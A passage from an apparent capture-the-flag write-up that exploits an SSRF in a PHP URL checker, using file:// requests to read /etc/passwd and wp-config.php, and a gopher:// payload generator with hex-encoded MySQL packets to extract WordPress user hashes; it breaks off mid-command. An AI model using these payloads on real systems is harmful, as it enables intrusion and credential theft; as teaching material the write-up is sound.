alt=/lib/images/articles/realgsmoveinsilencelikelasagna/red_7.png title=/lib/images/articles/realgsmoveinsilencelikelasagna/red_7.png></p><p>Hmmm&mldr; It includes the webpage, we might think there is a file inclusion somewhere!</p><h3 id=lfi-rce-or-ssrf>LFI, RCE or SSRF?</h3><p>Indeed, we can think of a Local File Inclusion, a Remote Command Execution or Server Side Request Forgery&mldr; But thanks to the output verbosity, we assume this script is using <code>curl</code>:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/realgsmoveinsilencelikelasagna/red_8.png data-srcset="/lib/images/articles/realgsmoveinsilencelikelasagna/red_8.png, /lib/images/articles/realgsmoveinsilencelikelasagna/red_8.png 1.5x, /lib/images/articles/realgsmoveinsilencelikelasagna/red_8.png 2x" data-sizes=auto alt=/lib/images/articles/realgsmoveinsilencelikelasagna/red_8.png title=/lib/images/articles/realgsmoveinsilencelikelasagna/red_8.png></p><p>Let&rsquo;s try to change the protocol used, something like <code>file://</code> instead of <code>http://</code>. If we don&rsquo;t miss the localhost condition, it should work:</p><blockquote><p>file://localhost/etc/passwd</p></blockquote><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/realgsmoveinsilencelikelasagna/red_9.png data-srcset="/lib/images/articles/realgsmoveinsilencelikelasagna/red_9.png, /lib/images/articles/realgsmoveinsilencelikelasagna/red_9.png 1.5x, /lib/images/articles/realgsmoveinsilencelikelasagna/red_9.png 2x" data-sizes=auto alt=/lib/images/articles/realgsmoveinsilencelikelasagna/red_9.png title=/lib/images/articles/realgsmoveinsilencelikelasagna/red_9.png></p><p>This application allows us to include arbitrary file, great. By the way, there is a user called <strong>odie</strong> on the system. I will display the content of <code>test.php</code>, just to be clear about the vulnerability:</p><blockquote><p>file://localhost/var/www/html/test.php</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> 
</span></span><span class=line><span class=cl><span class=k>include_once</span> <span class=s2>&#34;config_test.php&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>&lt;html&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;head&gt;
</span></span></span><span class=line><span class=cl><span class=err>	&lt;title&gt;Super curling&lt;/title&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;/head&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;body&gt;
</span></span></span><span class=line><span class=cl><span class=err>	&lt;form action=&#34;test.php&#34; method=&#34;post&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>		URL Checker - Beta: 
</span></span></span><span class=line><span class=cl><span class=err>		&lt;input type=&#34;text&#34; name=&#39;url&#39; /&gt;		
</span></span></span><span class=line><span class=cl><span class=err>	&lt;/form&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;?php
</span></span></span><span class=line><span class=cl><span class=err>if (isset($_POST[&#39;url&#39;])&amp;&amp;!empty($_POST[&#39;url&#39;]))
</span></span></span><span class=line><span class=cl><span class=err>{
</span></span></span><span class=line><span class=cl><span class=err>		$url = $_POST[&#39;url&#39;];
</span></span></span><span class=line><span class=cl><span class=err>			$content_url = getUrlContent($url);
</span></span></span><span class=line><span class=cl><span class=err>}
</span></span></span><span class=line><span class=cl><span class=err>else
</span></span></span><span class=line><span class=cl><span class=err>{
</span></span></span><span class=line><span class=cl><span class=err>		$content_url = &#34;&#34;;
</span></span></span><span class=line><span class=cl><span class=err>}
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>if(isset($_GET[&#39;debug&#39;]))
</span></span></span><span class=line><span class=cl><span class=err>{
</span></span></span><span class=line><span class=cl><span class=err>		show_source(__FILE__);
</span></span></span><span class=line><span class=cl><span class=err>}
</span></span></span><span class=line><span class=cl><span class=err>?&gt; 
</span></span></span><span class=line><span class=cl><span class=err>&lt;/body&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;/html&gt;
</span></span></span></code></pre></td></tr></table></div></div><p>Same operation to get the <code>config_test.php</code> content:</p><blockquote><p>file://localhost/var/www/html/config_test.php</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>safe</span><span class=p>(</span><span class=nv>$url</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nv>$tmpurl</span> <span class=o>=</span> <span class=nx>parse_url</span><span class=p>(</span><span class=nv>$url</span><span class=p>,</span> <span class=nx>PHP_URL_HOST</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nv>$tmpurl</span> <span class=o>!=</span> <span class=s2>&#34;localhost&#34;</span> <span class=k>and</span> <span class=nv>$tmpurl</span> <span class=o>!=</span> <span class=s2>&#34;127.0.0.1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>var_dump</span><span class=p>(</span><span class=nv>$tmpurl</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>die</span><span class=p>(</span><span class=s2>&#34;&lt;h1&gt;Only access to localhost&lt;/h1&gt;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nv>$url</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>getUrlContent</span><span class=p>(</span><span class=nv>$url</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=nv>$url</span> <span class=o>=</span> <span class=nx>safe</span><span class=p>(</span><span class=nv>$url</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nv>$url</span> <span class=o>=</span> <span class=nx>escapeshellarg</span><span class=p>(</span><span class=nv>$url</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nv>$pl</span> <span class=o>=</span> <span class=s2>&#34;curl -v &#34;</span><span class=o>.</span><span class=nv>$url</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>echo</span> <span class=nv>$pl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nv>$content</span> <span class=o>=</span> <span class=nx>shell_exec</span><span class=p>(</span><span class=nv>$pl</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>echo</span> <span class=nv>$content</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nv>$content</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>No more doubt, we got an SSRF in front of us. The RCE is not possible because of <code>escapeshellarg();</code> function in PHP.</p><h3 id=server-side-request-forgery>Server Side Request Forgery</h3><p>So now that I know there is an SSRF, we have to find a compatible service to interact with the system. There is a WordPress installed, then we can think that MySQL is being used. Let&rsquo;s try to get the configuration file from the CMS:</p><blockquote><p>file://localhost/var/www/html/wp-config.php</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span><span class=lnt>91
</span><span class=lnt>92
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=sd>/**
</span></span></span><span class=line><span class=cl><span class=sd> * The base configuration for WordPress
</span></span></span><span class=line><span class=cl><span class=sd> *
</span></span></span><span class=line><span class=cl><span class=sd> * The wp-config.php creation script uses this file during the
</span></span></span><span class=line><span class=cl><span class=sd> * installation. You don&#39;t have to use the web site, you can
</span></span></span><span class=line><span class=cl><span class=sd> * copy this file to &#34;wp-config.php&#34; and fill in the values.
</span></span></span><span class=line><span class=cl><span class=sd> *
</span></span></span><span class=line><span class=cl><span class=sd> * This file contains the following configurations:
</span></span></span><span class=line><span class=cl><span class=sd> *
</span></span></span><span class=line><span class=cl><span class=sd> * * MySQL settings
</span></span></span><span class=line><span class=cl><span class=sd> * * Secret keys
</span></span></span><span class=line><span class=cl><span class=sd> * * Database table prefix
</span></span></span><span class=line><span class=cl><span class=sd> * * ABSPATH
</span></span></span><span class=line><span class=cl><span class=sd> *
</span></span></span><span class=line><span class=cl><span class=sd> * @link https://codex.wordpress.org/Editing_wp-config.php
</span></span></span><span class=line><span class=cl><span class=sd> *
</span></span></span><span class=line><span class=cl><span class=sd> * @package WordPress
</span></span></span><span class=line><span class=cl><span class=sd> */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// ** MySQL settings - You can get this info from your web host ** //
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=sd>/** The name of the database for WordPress */</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span><span class=s1>&#39;DB_NAME&#39;</span><span class=p>,</span> <span class=s1>&#39;wp_db&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=sd>/** MySQL database username */</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span><span class=s1>&#39;DB_USER&#39;</span><span class=p>,</span> <span class=s1>&#39;wp_mysql_user&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=sd>/** MySQL database password */</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span><span class=s1>&#39;DB_PASSWORD&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=sd>/** MySQL hostname */</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span><span class=s1>&#39;DB_HOST&#39;</span><span class=p>,</span> <span class=s1>&#39;localhost&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=sd>/** Database Charset to use in creating database tables. */</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span><span class=s1>&#39;DB_CHARSET&#39;</span><span class=p>,</span> <span class=s1>&#39;utf8mb4&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=sd>/** The Database Collate type. Don&#39;t change this if in doubt. */</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span><span class=s1>&#39;DB_COLLATE&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=sd>/**#@+
</span></span></span><span class=line><span class=cl><span class=sd> * Authentication Unique Keys and Salts.
</span></span></span><span class=line><span class=cl><span class=sd> *
</span></span></span><span class=line><span class=cl><span class=sd> * Change these to different unique phrases!
</span></span></span><span class=line><span class=cl><span class=sd> * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
</span></span></span><span class=line><span class=cl><span class=sd> * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
</span></span></span><span class=line><span class=cl><span class=sd> *
</span></span></span><span class=line><span class=cl><span class=sd> * @since 2.6.0
</span></span></span><span class=line><span class=cl><span class=sd> */</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span><span class=s1>&#39;AUTH_KEY&#39;</span><span class=p>,</span>         <span class=s1>&#39;)Rd+$da6g*B/tnJv#L[l$Ms3O+;YGx5(;fd$%eA16&amp;Tc;6Gh|!nnrv23K1B&gt;/=C?&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span><span class=s1>&#39;SECURE_AUTH_KEY&#39;</span><span class=p>,</span>  <span class=s1>&#39;x8K1X9U?.Kf!sxlL0Mt6&amp;5 -wa,`&gt;HjBhp,j@LWyIIcwW#U)`m.C(6{v)EKfl|!&lt;&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span><span class=s1>&#39;LOGGED_IN_KEY&#39;</span><span class=p>,</span>    <span class=s1>&#39;~ZW7f:RWz,6s?fXB=EqZ/$j.d]@d^{l=q1SnCySLm,$]9Y9B&gt;lq n?]S&gt;10=F`9c&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span><span class=s1>&#39;NONCE_KEY&#39;</span><span class=p>,</span>        <span class=s1>&#39;@rs_~hBZ2 ;~A6/eH7C&amp;Q@JB}Af$IF=N5_CbuXq?DT|_n{TsFq|_g}[I&lt;)juXM=i&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span><span class=s1>&#39;AUTH_SALT&#39;</span><span class=p>,</span>        <span class=s1>&#39;SbuXoB.8TYTm`%WEKRN/9Me8O9C&gt;]K((y}s/3~IwpMBTrI6(&amp;JiD0&lt;nuf[huStMI&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span><span class=s1>&#39;SECURE_AUTH_SALT&#39;</span><span class=p>,</span> <span class=s1>&#39;w(wnD$yjnc@z6]Kal{.=Kv~G5{u$j=ZnKaN,#`Dl7xbS_(3OVi~w]0.Hk;wQ#lbB&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span><span class=s1>&#39;LOGGED_IN_SALT&#39;</span><span class=p>,</span>   <span class=s1>&#39;-1.h]p gm?rf1?6byNfAbK:VJ}3x&amp;dx2Gf-QS%a&lt;/GHh8t{to1T5a~lQ=408,PyM&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span><span class=s1>&#39;NONCE_SALT&#39;</span><span class=p>,</span>       <span class=s1>&#39;4v6W.P-H:4}wJdOo9XNtO0_eCp e9xpSi4m5Q6&lt;htwNo`JKynG2iq8A}[VCh[&amp;eS&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=sd>/**#@-*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=sd>/**
</span></span></span><span class=line><span class=cl><span class=sd> * WordPress Database Table prefix.
</span></span></span><span class=line><span class=cl><span class=sd> *
</span></span></span><span class=line><span class=cl><span class=sd> * You can have multiple installations in one database if you give each
</span></span></span><span class=line><span class=cl><span class=sd> * a unique prefix. Only numbers, letters, and underscores please!
</span></span></span><span class=line><span class=cl><span class=sd> */</span>
</span></span><span class=line><span class=cl><span class=nv>$table_prefix</span>  <span class=o>=</span> <span class=s1>&#39;wp_&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=sd>/**
</span></span></span><span class=line><span class=cl><span class=sd> * For developers: WordPress debugging mode.
</span></span></span><span class=line><span class=cl><span class=sd> *
</span></span></span><span class=line><span class=cl><span class=sd> * Change this to true to enable the display of notices during development.
</span></span></span><span class=line><span class=cl><span class=sd> * It is strongly recommended that plugin and theme developers use WP_DEBUG
</span></span></span><span class=line><span class=cl><span class=sd> * in their development environments.
</span></span></span><span class=line><span class=cl><span class=sd> *
</span></span></span><span class=line><span class=cl><span class=sd> * For information on other constants that can be used for debugging,
</span></span></span><span class=line><span class=cl><span class=sd> * visit the Codex.
</span></span></span><span class=line><span class=cl><span class=sd> *
</span></span></span><span class=line><span class=cl><span class=sd> * @link https://codex.wordpress.org/Debugging_in_WordPress
</span></span></span><span class=line><span class=cl><span class=sd> */</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span><span class=s1>&#39;WP_DEBUG&#39;</span><span class=p>,</span> <span class=k>false</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/* That&#39;s all, stop editing! Happy blogging. */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=sd>/** Absolute path to the WordPress directory. */</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=nx>defined</span><span class=p>(</span><span class=s1>&#39;ABSPATH&#39;</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>define</span><span class=p>(</span><span class=s1>&#39;ABSPATH&#39;</span><span class=p>,</span> <span class=nx>dirname</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>)</span> <span class=o>.</span> <span class=s1>&#39;/&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=sd>/** Sets up WordPress vars and included files. */</span>
</span></span><span class=line><span class=cl><span class=k>require_once</span><span class=p>(</span><span class=nx>ABSPATH</span> <span class=o>.</span> <span class=s1>&#39;wp-settings.php&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=o>&lt;/</span><span class=nx>body</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;/</span><span class=nx>html</span><span class=o>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>There are some interesting things to notice:</p><ul><li>MySQL is used ;</li><li>There is no password on the MySQL user <strong>wp_mysql_user</strong> ;</li><li>The database name is <code>wp_db</code>.</li></ul><p>There are many articles on the internet about SSRF exploitation with MySQL. Let&rsquo;s see how I can take advantage of this.</p><h3 id=ssrf-to-sql-injection>SSRF to SQL injection</h3><p>On my laptop, I installed MySQL (MariaDB), created a database called <code>wp_db</code>, created a user called <code>wp_mysql_user</code> without authentication password, downloaded and install WordPress:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>host $ mysql -u root -p 
</span></span><span class=line><span class=cl>MariaDB &gt; create database wp_db<span class=p>;</span>
</span></span><span class=line><span class=cl>MariaDB &gt; CREATE USER <span class=s1>&#39;wp_mysql_user&#39;</span>@<span class=s1>&#39;localhost&#39;</span> IDENTIFIED BY <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>MariaDB &gt; GRANT ALL PRIVILEGES ON *.* to <span class=s1>&#39;wp_mysql_user&#39;</span>@<span class=s1>&#39;localhost&#39;</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>Once my personal environment is similar to the target one, here is my MySQL request to get the Wordpress credentials:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>host $ mysql -u wp_mysql_user
</span></span><span class=line><span class=cl>MariaDB <span class=o>[(</span>none<span class=o>)]</span>&gt; <span class=k>select</span> user_login,user_pass from wp_db.wp_users<span class=p>;</span>
</span></span><span class=line><span class=cl>+--------------+------------------------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> user_login   <span class=p>|</span> user_pass                          <span class=p>|</span>
</span></span><span class=line><span class=cl>+--------------+------------------------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> test_user    <span class=p>|</span> SomeWordpressHash                  <span class=p>|</span>
</span></span><span class=line><span class=cl>+--------------+------------------------------------+
</span></span><span class=line><span class=cl><span class=m>1</span> row in <span class=nb>set</span> <span class=o>(</span>0.00 sec<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>host $ mysql -h localhost -u wp_mysql_user -e <span class=s2>&#34;select user_login,user_pass from wp_db.wp_users;&#34;</span>
</span></span><span class=line><span class=cl>+--------------+------------------------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> user_login   <span class=p>|</span> user_pass                          <span class=p>|</span>
</span></span><span class=line><span class=cl>+--------------+------------------------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> test_user    <span class=p>|</span> SomeWordpressHash                  <span class=p>|</span>
</span></span><span class=line><span class=cl>+--------------+------------------------------------+
</span></span></code></pre></td></tr></table></div></div><p>The second request is just a one liner specifying that it is necessary to go through the localhost.</p><p>To execute SQL commands, I will need to look at the query in Wireshark and understand which data is sent and how. The following article will probably explain this better than me: <a href=https://paper.seebug.org/510/ target=_blank rel="noopener noreffer">https://paper.seebug.org/510/</a></p><p>The mentioned article shows us how to simulate the MySQL request in a local environment, retrieve data transmitted and replay them. This means that MariaDB has no specific protection against regame or authenticity.</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/realgsmoveinsilencelikelasagna/red_10.gif data-srcset="/lib/images/articles/realgsmoveinsilencelikelasagna/red_10.gif, /lib/images/articles/realgsmoveinsilencelikelasagna/red_10.gif 1.5x, /lib/images/articles/realgsmoveinsilencelikelasagna/red_10.gif 2x" data-sizes=auto alt=/lib/images/articles/realgsmoveinsilencelikelasagna/red_10.gif title=/lib/images/articles/realgsmoveinsilencelikelasagna/red_10.gif></p><p>Displayed bytes at the end of the above GIF will be used as payload to get the username and hashed password from the WordPress database. With a little python script, stolen to our asian friends, I will be able to generate the complete payload:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/python2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>result</span><span class=p>(</span><span class=n>s</span><span class=p>):</span>
</span></span><span class=line><span class=cl>  <span class=n>a</span> <span class=o>=</span> <span class=p>[</span><span class=n>s</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>2</span><span class=p>]</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>xrange</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>s</span><span class=p>),</span> <span class=mi>2</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=s2>&#34;gopher://127.0.0.1:3306/_%&#34;</span> <span class=o>+</span> <span class=s2>&#34;%&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>a</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>  <span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl>  <span class=n>s</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=n>result</span><span class=p>(</span><span class=n>s</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>In fact, this python script will just add <code>gopher://127.0.0.1:3306/_</code> in front of our payload and add a <code>%</code> every two characters. Otherwise, the web server will not take the data as hex data.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>host $ cat ssrf_mysql2 <span class=p>|</span> xxd -p <span class=p>|</span> tr -d <span class=s1>&#39;\n&#39;</span>
</span></span><span class=line><span class=cl>ac00000185a23f000000000121000000000000000000000000000000000000000000000077705f6d7973716c5f7573657200006d7973716c5f6e61746976655f70617373776f72640066035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f70696404393230360f5f636c69656e745f76657273696f6e0731302e312e3337095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c300000000373656c65637420757365725f6c6f67696e2c757365725f706173732066726f6d2077705f64622e77705f75736572730100000001
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>host $ ./parse.py ac00000185a23f000000000121000000000000000000000000000000000000000000000077705f6d7973716c5f7573657200006d7973716c5f6e61746976655f70617373776f72640066035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f70696404393230360f5f636c69656e745f76657273696f6e0731302e312e3337095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c300000000373656c65637420757365725f6c6f67696e2c757365725f706173732066726f6d2077705f64622e77705f75736572730100000001
